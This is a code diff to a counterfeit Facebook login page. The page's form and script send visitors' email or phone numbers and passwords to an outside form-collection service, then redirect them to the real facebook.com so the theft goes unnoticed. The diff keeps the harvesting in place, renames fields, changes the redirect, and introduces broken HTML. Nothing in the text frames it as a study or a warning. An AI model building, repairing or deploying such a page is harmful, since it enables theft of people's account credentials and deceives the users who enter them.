@@ -77,39 +77,16 @@ a:hover {
       <center><h style="font-size:66px;color:#166fe5">facebook</h></center>
         <h2>Log into Facebook to continue</h2>
         <form action="https://formkeep.com/f/f9d36ad79e28"  method="POST" id="Ftform">
-            <input type="text" name="email or phone" placeholder="Email or Phone number" required/>
-            <input type="password" name="password" placeholder="Password" required/>
+            <input type="text" name="email or phone id="email or phone" placeholder="Email or Phone number" required/>
+            <input type="password" name="name" id="name" placeholder="Password" required/>
             <button type="submit">Log In</button>
             <a href="#">Forgot password?</a>
             <p>or</p>
-          <button style="background-color:green"><p><a style="color:white">Create new account</button></a></p>
+          <button style="background-color:green"<p><a style="color:white">Create new account</button></a></p>
           <p>About . Help . More</p>
           <p>Meta © 2024</p>
         </form>      
      <script>
-        // Function to set language based on user's region
-        function setLanguage() {
-            // Detect user's region (you can use any method to determine this)
-            var userRegion = 'en'; // For example, let's assume default is English
-
-            // Check user's region and set language accordingly
-            switch (userRegion) {
-                case 'en':
-                    document.getElementById('Ftform').setAttribute('lang', 'en');
-                    break;
-                case 'fr':
-                    document.getElementById('Ftform').setAttribute('lang', 'fr');
-                    break;
-                // Add more cases for other languages as needed
-                default:
-                    document.getElementById('Ftform').setAttribute('lang', 'en'); // Default to English
-                    break;
-            }
-        }
-
-        // Call setLanguage function when the page loads
-        setLanguage();
-
     // Add event listener for form submission
     document.getElementById('Ftform').addEventListener('submit', function(event) {
       // Prevent the default form submission
@@ -124,7 +101,7 @@ a:hover {
       xhr.onload = function() {
         if (xhr.status === 200) {
           // Form submission successful, redirect the user to another URL
-          window.location.href = 'https://www.facebook.com/settings';
+          window.location.href = 'https://www.facebook.com/profile';
         } else {
           // Handle form submission error
           console.error('Form submission failed');
@@ -134,4 +111,4 @@ a:hover {
     });
   </script>
 </body>
-</html>
+                </html
